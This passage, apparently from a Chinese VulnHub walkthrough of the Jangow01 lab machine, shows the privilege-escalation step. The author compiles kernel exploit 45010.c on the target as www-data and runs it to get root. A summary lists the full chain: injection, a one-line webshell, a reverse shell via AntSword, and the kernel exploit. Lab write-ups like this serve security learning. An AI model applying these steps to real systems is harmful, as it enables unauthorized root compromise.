+</span></span><span style=display:flex><span>./exp1: /lib/x86_64-linux-gnu/libc.so.6: version <span style=color:#5af78e>`</span>GLIBC_2.34<span style=color:#ff5c57>&#39;</span> not found <span style=color:#ff6ac1>(</span>required by ./exp1<span style=color:#ff6ac1>)</span></span></span></code></pre></div><p>最后报错，<code>GLIBC_2.34</code>没找到，这是由于我在最新的kali linux上编译了程序，但靶机是Ubuntu 16.04，它携带的GLIBC版本远低于2.34，无法满足程序运行的需求</p><p>解决思路：让靶机自己编译<code>45010.c</code>
+因此拖拽45010.c文件到蚁剑里</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-zsh data-lang=zsh><span style=display:flex><span>www-data@jangow01:/etc$ <span style=color:#ff5c57>cd</span> /var/www/html/site/
+</span></span><span style=display:flex><span>www-data@jangow01:/var/www/html/site$ gcc 45010.c -o exp1
+</span></span><span style=display:flex><span>gcc 45010.c -o exp1
+</span></span><span style=display:flex><span>www-data@jangow01:/var/www/html/site$ chmod +x exp1
+</span></span><span style=display:flex><span>chmod +x exp1
+</span></span><span style=display:flex><span>www-data@jangow01:/var/www/html/site$ ./exp1
+</span></span><span style=display:flex><span>./exp1
+</span></span><span style=display:flex><span>id
+</span></span><span style=display:flex><span><span style=color:#ff5c57>uid</span><span style=color:#ff6ac1>=</span>0<span style=color:#ff6ac1>(</span>root<span style=color:#ff6ac1>)</span> <span style=color:#ff5c57>gid</span><span style=color:#ff6ac1>=</span>0<span style=color:#ff6ac1>(</span>root<span style=color:#ff6ac1>)</span> <span style=color:#ff5c57>groups</span><span style=color:#ff6ac1>=</span>0<span style=color:#ff6ac1>(</span>root<span style=color:#ff6ac1>)</span>,33<span style=color:#ff6ac1>(</span>www-data<span style=color:#ff6ac1>)</span></span></span></code></pre></div><p>提权成功</p><h2 id=八总结>八、总结<a class=anchor href=#%e5%85%ab%e6%80%bb%e7%bb%93>#</a></h2><p>总体思路是先进行端口扫描，接着进行网页勘察，接着发现注入漏洞，注入一句话木马，利用蚁剑尝试反弹shell，根据内核版本查找提权的漏洞，接着将病毒源代码放入靶机编译执行，提权</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"><div><a class="flex align-center" href=https://github.com/vnccer/vnccer.github.io/commit/550a5ca8fc8b807219ecbc1c32a2b3a69fb958d2 title='Last modified by vnccer | May 26, 2026' target=_blank rel=noopener><img src=/icons/calendar.svg class=book-icon alt=Calendar>
+<span>May 26, 2026</span></a></div><div></div></div><div class="flex flex-wrap justify-between"><span><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_ICA_1/ class="flex align-center"><img src=/icons/backward.svg class=book-icon alt=Backward>
+<span>ICA: 1</span>
+</a></span><span><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_Napping-1.0.1/ class="flex align-center"><span>Napping: 1.0.1</span>
+<img src=/icons/forward.svg class=book-icon alt=Forward></a></span></div><div class=book-comments></div><div class="book-copyright flex justify-center"><small>vnccer - <a href=https://creativecommons.org/licenses/by/4.0/legalcode>© CC BY 4.0</a></small></div><script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li><a href=#一靶机网卡修复>一、靶机网卡修复</a></li><li><a href=#二识别靶机ip>二、识别靶机ip</a></li><li><a href=#三端口扫描nmap>三、端口扫描nmap</a></li><li><a href=#四获得shell失败>四、获得shell（失败）</a><ul><li><a href=#searchsploit>searchsploit</a></li><li><a href=#ftp>FTP</a></li></ul></li><li><a href=#五http扫描>五、HTTP扫描</a><ul><li><a href=#nikto>nikto</a></li><li><a href=#目录扫描dirb>目录扫描dirb</a></li><li><a href=#wpscan>wpscan</a></li><li><a href=#gobuster>gobuster</a></li><li><a href=#网页url>网页URL</a></li></ul></li><li><a href=#六反弹shell>六、反弹shell</a></li><li><a href=#七提权>七、提权</a></li><li><a href=#八总结>八、总结</a></li></ul></li></ul></nav></div></aside></main></body></html>
